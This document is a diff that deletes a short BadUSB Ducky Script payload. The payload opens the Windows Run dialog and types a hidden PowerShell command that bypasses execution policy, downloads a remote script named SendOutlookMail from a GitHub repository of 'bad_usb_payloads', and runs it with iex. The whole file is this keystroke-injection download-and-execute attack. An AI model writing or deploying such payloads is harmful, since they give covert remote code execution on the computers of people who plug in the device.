@@ -1,5 +1,0 @@
-GUI r
-DELAY 500
-STRING_DELAY 5
-STRING powershell -w h -NoP -NonI -Ep Bypass -c "& {iex (iwr 'https://raw.githubusercontent.com/MagikarpLv13/bad_usb_payloads/master/SendOutlookMail/script.ps1')}"
-ENTER
